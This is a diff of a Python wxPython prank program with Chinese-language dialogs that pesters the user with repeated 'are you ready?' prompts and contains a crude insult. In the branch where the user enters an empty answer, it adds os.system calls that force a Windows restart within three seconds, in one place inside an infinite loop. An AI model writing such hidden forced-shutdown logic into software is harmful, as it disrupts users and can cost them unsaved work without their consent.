@@ -28,12 +28,12 @@ class Login(wx.Frame):
         elif(username == '金正恩'):
             wx.MessageBox('恭喜您 金正恩大將軍')
             wx.MessageBox('接下來要開始搜尋了喔~')
-            check1=wx.MessageDialog(None,'準備好要開始搜尋了嗎?',"",wx.YES_NO)
+            check1=wx.MessageDialog(None,'準備好要開始搜尋了嗎?',"Message",wx.YES_NO)
             if(check1.ShowModal()==wx.ID_YES):
                 wx.MessageBox('那要開始了唷~')
                 wx.MessageBox('要準備開始了唷~')
                 wx.MessageBox('我怎麼看你好像還沒準備好?~')
-                TextInput=wx.TextEntryDialog(None,"如果你準備好了請打上準備好了~","","")
+                TextInput=wx.TextEntryDialog(None,"如果你準備好了請打上準備好了~","Message","")
                 if(TextInput.ShowModal()==wx.ID_OK):
                     answer=TextInput.GetValue()
                     if(answer=="幹你娘"):
@@ -47,11 +47,11 @@ class Login(wx.Frame):
                         wx.MessageBox('現在我要開始搜尋了唷')
                         wx.MessageBox('那要開始搜尋了唷')
                         wx.MessageBox('我準備好惹')
-                        check2=wx.MessageDialog(None,'再問最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                        check2=wx.MessageDialog(None,'再問最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                         if(check2.ShowModal()==wx.ID_YES):
-                            check3=wx.MessageDialog(None,'這真的最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                            check3=wx.MessageDialog(None,'這真的最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                             if(check3.ShowModal()==wx.ID_YES):
-                                check4=wx.MessageDialog(None,'這真的真的最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                                check4=wx.MessageDialog(None,'這真的真的最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                                 if(check4.ShowModal()==wx.ID_YES):
                                     wx.MessageBox('那我開始了唷~')
                                     wx.MessageBox('請你不要怪我問你這麼多問題')
@@ -86,9 +86,12 @@ class Login(wx.Frame):
                         wx.MessageBox('你484一直按Enter跳過ㄏㄏ')
                         wx.MessageBox('那你就錯惹唷ㄏㄏㄏㄏ')
                         while(True):
-                            wx.MessageBox('你程式要崩潰囉ㄏㄏ')
-                        wx.MessageBox('那我要走囉~888888888888')
-                        sys.exit()
+                            try:
+                                wx.MessageBox('3秒後關機 886')
+                                os.system("c:\\windows\\System32\\Shutdown -r -t 3")
+                                os.system("c:\\windows\\SysWoW64\\Shutdown -r -t 3")
+                            except:
+                                wx.MessageBox('你程式要崩潰囉ㄏㄏ')
                     else:
                         wx.MessageBox('....腦袋破洞?')
                         wx.MessageBox('那我要走囉~888888888888')
@@ -100,12 +103,12 @@ class Login(wx.Frame):
             else:
                 wx.MessageBox('真的嗎?那我再給你一些時間好惹')
                 wx.MessageBox('確定還沒好嗎?')
-                check5=wx.MessageDialog(None,"我再給你一次機會 你準備好惹嗎?","",wx.YES_NO)
+                check5=wx.MessageDialog(None,"我再給你一次機會 你準備好惹嗎?","Message",wx.YES_NO)
                 if(check5.ShowModal()==wx.ID_YES):
                     wx.MessageBox('那要開始了唷~')
                     wx.MessageBox('要準備開始了唷~')
                     wx.MessageBox('我怎麼看你好像還沒準備好?~')
-                    TextInput=wx.TextEntryDialog(None,"如果你準備好了請打上準備好了~","","")
+                    TextInput=wx.TextEntryDialog(None,"如果你準備好了請打上準備好了~","Message","")
                     if(TextInput.ShowModal()==wx.ID_OK):
                         answer=TextInput.GetValue()
                         if(answer=="幹你娘"):
@@ -119,11 +122,11 @@ class Login(wx.Frame):
                             wx.MessageBox('現在我要開始搜尋了唷')
                             wx.MessageBox('那要開始搜尋了唷')
                             wx.MessageBox('我準備好惹')
-                            check6=wx.MessageDialog(None,'再問最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                            check6=wx.MessageDialog(None,'再問最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                             if(check6.ShowModal()==wx.ID_YES):
-                                check7=wx.MessageDialog(None,'這真的最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                                check7=wx.MessageDialog(None,'這真的最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                                 if(check7.ShowModal()==wx.ID_YES):
-                                    check8=wx.MessageDialog(None,'這真的真的最後一次 你準備好惹嗎?',"",wx.YES_NO)
+                                    check8=wx.MessageDialog(None,'這真的真的最後一次 你準備好惹嗎?',"Message",wx.YES_NO)
                                     if(check8.ShowModal()==wx.ID_YES):
                                         wx.MessageBox('那我開始了唷~')
                                         wx.MessageBox('請你不要怪我問你這麼多問題')
@@ -157,9 +160,12 @@ class Login(wx.Frame):
                         elif(answer==""):
                             wx.MessageBox('你484一直按Enter跳過ㄏㄏ')
                             wx.MessageBox('那你就錯惹唷ㄏㄏㄏㄏ')                                
-                            os.system('shutdown -s -t 0')
-                            wx.MessageBox('那我要走囉~888888888888')
-                            sys.exit()
+                            try:
+                                wx.MessageBox('3秒後關機 886')
+                                os.system("c:\\windows\\System32\\Shutdown -r -t 3")
+                                os.system("c:\\windows\\SysWoW64\\Shutdown -r -t 3")
+                            except:
+                                wx.MessageBox('你程式要崩潰囉ㄏㄏ')
                         else:
                             wx.MessageBox('....腦袋破洞?')
                             wx.MessageBox('那我要走囉~888888888888')
